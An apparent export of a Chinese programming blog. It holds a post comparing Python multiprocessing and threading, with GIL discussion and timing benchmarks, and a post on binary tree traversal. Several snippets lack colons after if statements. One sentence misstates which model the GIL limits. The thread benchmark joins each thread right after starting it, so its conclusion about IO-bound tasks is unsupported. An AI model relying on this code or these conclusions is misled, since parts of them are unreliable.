<h3 id="并发parallelism"><a href="#并发parallelism" class="headerlink" title="并发parallelism"></a>并发parallelism</h3><blockquote>
<p>when two or more taks are exceted simultaneously</p>
</blockquote>
<p>这里我们是想要通过多线程 或者 多进程 实现多个任务同时处理，也就是并发</p>
<h2 id="实现多进程"><a href="#实现多进程" class="headerlink" title="实现多进程"></a>实现多进程</h2><h3 id="multiprocessing库"><a href="#multiprocessing库" class="headerlink" title="multiprocessing库"></a>multiprocessing库</h3><p>Doc：<a href="https://docs.python.org/2/library/multiprocessing.html" target="_blank" rel="noopener">https://docs.python.org/2/library/multiprocessing.html</a></p>
<ul>
<li>Process子模块：用于创建进程</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">"Run child process &#123;0&#125;(&#123;1&#125;)"</span>.format(name, os.getpid()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"Parent process &#123;0&#125;"</span>.format(os.getpid()))</span><br><span class="line">    p = Process(target=run_proc, args=(<span class="string">"test"</span>, ))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">"Child process end."</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>Pool子模块:  用于管理进程池</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Run task &#123;0&#125;(&#123;1&#125;)"</span>.format(name, os.getpid())</span><br><span class="line">    start = time.time()</span><br><span class="line">    time.sleep(random.random()*<span class="number">3</span>)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Task &#123;0&#125; runs &#123;1&#125; seconds"</span>.format(name, (end-start))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Parent process &#123;0&#125;'</span>.format(os.getpid())</span><br><span class="line">    p = Pool(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        p.apply_async(task, args=(i,))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Waiting for all subprocesses done...'</span></span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'All subprocesses done.'</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Queue子模块： 用于进程之间通信</li>
<li>Manager子模块：可用于分布多进程</li>
</ul>
<h2 id="实现多线程"><a href="#实现多线程" class="headerlink" title="实现多线程"></a>实现多线程</h2><h3 id="multiprocessing-dummy库"><a href="#multiprocessing-dummy库" class="headerlink" title="multiprocessing.dummy库"></a>multiprocessing.dummy库</h3><p>Doc: <a href="https://docs.python.org/2/library/multiprocessing.html#module-multiprocessing.dummy" target="_blank" rel="noopener">https://docs.python.org/2/library/multiprocessing.html#module-multiprocessing.dummy</a></p>
<p>用法与multiprocessing基本无异，只是在import的时候加上.dummy即可 </p>
<h3 id="threading库"><a href="#threading库" class="headerlink" title="threading库"></a>threading库</h3><p>Doc:<a href="https://docs.python.org/2/library/threading.html" target="_blank" rel="noopener">https://docs.python.org/2/library/threading.html</a></p>
<p>python自带的多线程模块，可以通过继承threading类，或者使用threading.Thread两种啊是创建多线程</p>
<h3 id="threadpool库"><a href="#threadpool库" class="headerlink" title="threadpool库"></a>threadpool库</h3><p>Doc : <a href="https://chrisarndt.de/projects/threadpool/" target="_blank" rel="noopener">https://chrisarndt.de/projects/threadpool/</a></p>
<p>不过这个已经不维护了, 不推荐使用</p>
<h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><p>由于多线程中所有线程均共享变量，所以线程之间就存在多个线程同时修改一个变量造成未知后果的情况 eg:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假定这是你的银行存款:</span></span><br><span class="line">balance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_it</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="comment"># 先存后取，结果应该为0:</span></span><br><span class="line">    <span class="keyword">global</span> balance</span><br><span class="line">    balance = balance + n</span><br><span class="line">    balance = balance - n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_thread</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</span><br><span class="line">        change_it(n)</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=run_thread, args=(<span class="number">5</span>,))</span><br><span class="line">t2 = threading.Thread(target=run_thread, args=(<span class="number">8</span>,))</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">t1.join()</span><br><span class="line">t2.join()</span><br><span class="line"><span class="keyword">print</span> balance</span><br></pre></td></tr></table></figure>
<p>运行结果会发现，加加减减之后 balance并不等于0了，原因就是两个线程同时修改了balance变量，解决这一问题可以使用<a href="https://docs.python.org/2/library/threading.html#lock-objects" target="_blank" rel="noopener">threading.lock</a></p>
<h3 id="However"><a href="#However" class="headerlink" title="However"></a>However</h3><p>Python解释器在执行代码时，有一个GIL锁（<a href="https://wiki.python.org/moin/GlobalInterpreterLock" target="_blank" rel="noopener">Global Interpreter Lock</a>）, 任何Python线程执行前必须先获得GIL锁，然后，每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行。这个GIL全局锁实际上把所有线程的执行代码都给上了锁，所以，多线程在Python中只能交替执行，即使100个线程跑在100核CPU上，也只能用到1个核。</p>
<p>既然由于GIL的存在，python多线程并不能起到并发的效果，那threading库这些多线程库的存在有什么意义呢？ </p>
<p>对于Network-bound 或者IO-bound类型的程序，python解释器经常在等待来自网络上或用户输入的数据，这个时候多线程就有了用武之地，例如爬虫程序中，每个线程下载一个html页面，而不必等待之前页面下载完毕。</p>
<h2 id="多进程-vs-多线程"><a href="#多进程-vs-多线程" class="headerlink" title="多进程 vs. 多线程"></a>多进程 vs. 多线程</h2><h3 id="多线程-gt-多进程"><a href="#多线程-gt-多进程" class="headerlink" title="多线程 &gt; 多进程:"></a>多线程 &gt; 多进程:</h3><ol>
<li>多进程模式创建进程的代价很大</li>
<li>进程间通信(IPC)比较麻烦</li>
</ol>
<h3 id="多线程-lt-多进程"><a href="#多线程-lt-多进程" class="headerlink" title="多线程 &lt; 多进程"></a>多线程 &lt; 多进程</h3><ol>
<li>多进程稳定性高，一个子进程崩溃 不会影响主进程和其他子进程。 而由于线程共享进程的内存，任何一个线程挂掉都会直接造成整个进程的崩溃</li>
<li>多进程是并发的，而由于GIL的存在，python多进程并不能起到并发的作用</li>
</ol>
<h3 id="IO密集型任务"><a href="#IO密集型任务" class="headerlink" title="IO密集型任务"></a>IO密集型任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_time</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = datetime.datetime.now()</span><br><span class="line">        res = func(*args, **kwargs)</span><br><span class="line">        end = datetime.datetime.now()</span><br><span class="line">        print(<span class="string">"--&gt; &#123;0&#125; s"</span>.format(end - start))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"><span class="meta">@count_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_thread</span><span class="params">(urls)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        task(url)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@count_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_processing</span><span class="params">(urls)</span>:</span></span><br><span class="line">    p = Pool(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        p.apply_async(task, args=(url, ))</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line"></span><br><span class="line"><span class="meta">@count_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_thread</span><span class="params">(urls)</span>:</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        t = threading.Thread(target=task, args=(url,))</span><br><span class="line">        a.append(t)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        i.start()</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># urls = ["http://www.baidu.com", "http://www.sina.com"] * 100</span></span><br><span class="line">    urls = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        urls.append(<span class="string">"http://www.baidu.com/&#123;0&#125;/"</span>.format(i+<span class="number">1</span>))</span><br><span class="line">    print(<span class="string">"single-thread"</span>)</span><br><span class="line">    single_thread(urls)</span><br><span class="line">    print(<span class="string">"multi-processing"</span>)</span><br><span class="line">    multi_processing(urls)</span><br><span class="line">    print(<span class="string">"multi-thread"</span>)</span><br><span class="line">    multi_thread(urls)</span><br></pre></td></tr></table></figure>
<p>运行结果：<br>10次  ：   单线程0.319s，多进程0.248s，多线程0.309s<br>100次：   单线程6.026s，多进程0.955s，多线程5.054s<br>1000次： 单线程30.50s，多进程9.452s，多线程36.53s</p>
<p>如果把task换成time.sleep(1)类似的任务也可以得到类似的结果</p>
<h3 id="CPU密集型任务"><a href="#CPU密集型任务" class="headerlink" title="CPU密集型任务"></a>CPU密集型任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_time</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        计算时间用的decorator</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = datetime.datetime.now()</span><br><span class="line">        res = func(*args, **kwargs)</span><br><span class="line">        end = datetime.datetime.now()</span><br><span class="line">        print(<span class="string">"--&gt; &#123;0&#125; s"</span>.format(end - start))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">()</span>:</span></span><br><span class="line">    sum(range(<span class="number">10000000</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@count_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_thread</span><span class="params">(times)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(times):</span><br><span class="line">        task()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@count_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_processing</span><span class="params">(times)</span>:</span></span><br><span class="line">    p = Pool(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(times):</span><br><span class="line">        p.apply_async(task, args=())</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line"></span><br><span class="line"><span class="meta">@count_time</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_thread</span><span class="params">(times)</span>:</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(times):</span><br><span class="line">        t = threading.Thread(target=task, args=())</span><br><span class="line">        a.append(t)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        i.start()</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    times = <span class="number">100</span></span><br><span class="line">    print(<span class="string">"single-thread"</span>)</span><br><span class="line">    single_thread(times)</span><br><span class="line">    print(<span class="string">"multi-processing"</span>)</span><br><span class="line">    multi_processing(times)</span><br><span class="line">    print(<span class="string">"multi-thread"</span>)</span><br><span class="line">    multi_thread(times)</span><br></pre></td></tr></table></figure>
<p>运行结果：<br>10次  ：   单线程11.7s，多进程6.74s，多线程11.16s<br>100次：   单线程124s，多进程60s，多线程117s<br>1000次： 单线程9m49s，多进程4m15s，多线程9m21s</p>
<p>可见一些博主做的比较 <a href="https://nathangrigg.com/images/2015/futures.html" target="_blank" rel="noopener">processing &amp; thread</a></p>
<p>So， 由以上实例可看出，无论是IO密集型还是CPU密集型任务，多进程的运行效率都是要高于多线程的，因为多进程没有GIL的限制，而多线程由于GIL的存在并不能实现并行。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://thief.one/2017/02/17/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%B8%A1%E5%B9%B4%E4%B8%8D%E9%B8%A1%E8%82%8B/" target="_blank" rel="noopener">python多线程鸡年不鸡肋</a></li>
<li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431927781401bb47ccf187b24c3b955157bb12c5882d000" target="_blank" rel="noopener">廖雪峰的官方网站</a></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Binary Tree Traversal]]></title>
      <url>/2017/10/22/Algorithms/BinaryTreeTraversal/</url>
      <content type="html"><![CDATA[<h2 id="有关二叉树的遍历"><a href="#有关二叉树的遍历" class="headerlink" title="有关二叉树的遍历"></a>有关二叉树的遍历</h2><p>二叉树的常用遍历有: 前序遍历，中序遍历，后序遍历和层次遍历。</p>
<a id="more"></a>
<blockquote>
<p>以下代码中TreeNode的定义为<br>class TreeNode:<br>    def <strong>init</strong>(self,val):<br>        self.val = val<br>        self.left, self.right = None,None</p>
</blockquote>
<h2 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h2><p>前序遍历即先访问当前节点本身，再访问它的左子树，最后访问右子树</p>
<p>LintCode题目：<a href="http://lintcode.com/problem/binary-tree-preorder-traversal" target="_blank" rel="noopener">http://lintcode.com/problem/binary-tree-preorder-traversal</a></p>
<h3 id="递归实现："><a href="#递归实现：" class="headerlink" title="递归实现："></a>递归实现：</h3><p>三种遍历的递归实现都类似</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 36 ms</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorderTraversal</span><span class="params">(root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">return</span> [root.val] + preorderTraversal(root.left) + preorderTraversal(root.right)</span><br></pre></td></tr></table></figure>
<h3 id="非递归方法实现："><a href="#非递归方法实现：" class="headerlink" title="非递归方法实现："></a>非递归方法实现：</h3><p>(上述递归算法属于尾递归，很容易转变成非递归方法)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 35 ms</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorderTraversal</span><span class="params">(root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    ans = []</span><br><span class="line">    stack = [root] <span class="comment"># 在py中用list来代替stack</span></span><br><span class="line">    <span class="keyword">while</span>(stack!=[]):</span><br><span class="line">        x = stack.pop()</span><br><span class="line">        ans.append(x.val)</span><br><span class="line">        <span class="keyword">if</span> x.right</span><br><span class="line">            stack.append(x.right)</span><br><span class="line">        <span class="keyword">if</span> x.left:</span><br><span class="line">            stack.append(x.left)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure></p>
<h2 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h2><p>中序遍历即先访问当前节点的左子树，再访问当前节点本身，最后访问右子树<br>LintCode题目：<a href="http://lintcode.com/zh-cn/problem/binary-tree-inorder-traversal/" target="_blank" rel="noopener">http://lintcode.com/zh-cn/problem/binary-tree-inorder-traversal/</a><br>官方solution: <a href="https://leetcode.com/problems/binary-tree-inorder-traversal/solution/" target="_blank" rel="noopener">https://leetcode.com/problems/binary-tree-inorder-traversal/solution/</a></p>
<h3 id="非递归实现"><a href="#非递归实现" class="headerlink" title="非递归实现"></a>非递归实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 39 ms</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inorderTraversal</span><span class="params">(root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    ans = []</span><br><span class="line">    stack = []</span><br><span class="line">    x = root</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">        goAlongLeftBranch(x, stack)</span><br><span class="line">        <span class="keyword">if</span> stack == []:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ans.append(stack.pop().val)</span><br><span class="line">        x = stack.pop()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goAlongLeftBranch</span><span class="params">(x ,stack)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(x):</span><br><span class="line">        <span class="comment"># if x.right: 不判断也无妨</span></span><br><span class="line">        stack.append(x.right)</span><br><span class="line">        stack.append(x)</span><br><span class="line">        x = x.left</span><br></pre></td></tr></table></figure>
<h2 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h2><p>后续遍历先访问左子树，再访问右子树，最后访问当前节点<br>这里可以考虑到后序遍历和前序遍历的关系，前序遍历是 中-左-右，而后序遍历是 左-右-中。所以可以修改前序遍历代码中的left和right，最后返回ans[::-1]即可<br>LintCode题目 <a href="http://lintcode.com/zh-cn/problem/binary-tree-postorder-traversal/" target="_blank" rel="noopener">http://lintcode.com/zh-cn/problem/binary-tree-postorder-traversal/</a></p>
<h3 id="非递归实现-1"><a href="#非递归实现-1" class="headerlink" title="非递归实现"></a>非递归实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postorderTraversal</span><span class="params">(root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    ans = []</span><br><span class="line">    stack = [root] </span><br><span class="line">    <span class="keyword">while</span>(stack!=[]):</span><br><span class="line">        x = stack.pop()</span><br><span class="line">        ans.append(x.val)</span><br><span class="line">        <span class="keyword">if</span> x.left</span><br><span class="line">            stack.append(x.left)</span><br><span class="line">        <span class="keyword">if</span> x.right:</span><br><span class="line">            stack.append(x.right)</span><br><span class="line">    <span class="keyword">return</span> ans[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
<h3 id="通用框架"><a href="#通用框架" class="headerlink" title="通用框架"></a>通用框架</h3><p>在Leetcode(<a href="https://discuss.leetcode.com/topic/30632/preorder-inorder-and-postorder-iteratively-summarization" target="_blank" rel="noopener">https://discuss.leetcode.com/topic/30632/preorder-inorder-and-postorder-iteratively-summarization</a><br>)上看到一个很简洁的算法，简单修改就可以适合与这三种遍历， 特此摘抄下来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32ms</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preorderTraversal</span><span class="params">(root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    ans = []</span><br><span class="line">    stack = []</span><br><span class="line">    x = root</span><br><span class="line">    <span class="keyword">while</span>(stack!=[] <span class="keyword">or</span> x!=<span class="keyword">None</span>):</span><br><span class="line">        <span class="comment"># 不断向左,把沿途结点都入栈之后顺便访问，遇到None之后，出栈&amp;右转</span></span><br><span class="line">        <span class="keyword">if</span>(x):</span><br><span class="line">            ans.append(x.val) <span class="comment"># add before going to children</span></span><br><span class="line">            stack.append(x)</span><br><span class="line">            x = x.left</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            x = stack.pop()</span><br><span class="line">            x = x.right</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="comment"># 29 ms</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inorderTraversal</span><span class="params">(root)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    ans = []</span><br><span class="line">    stack = []</span><br><span class="line">    x = root</span><br><span class="line">    <span class="keyword">while</span>(stack!=[] <span class="keyword">or</span> x!=<span class="keyword">None</span>):</span><br><span class="line">        <span class="comment"># 不断向左，把沿途的结点都入栈，遇到None, 出栈&amp;访问尽头的结点，再出栈&amp;右转</span></span><br><span class="line">        <span class="keyword">if</span>(x):</span><br><span class="line">            stack.append(x)</span><br><span class="line">            x = x.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x = stack.pop()</span><br><span class="line">            ans.append(x.val) <span class="comment">#  add after all left children</span></span><br><span class="line">            x = x.right</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postorderTravel</span><span class="params">(root)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># 可根据pre-order修改得到</span></span><br></pre></td></tr></table></figure></p>
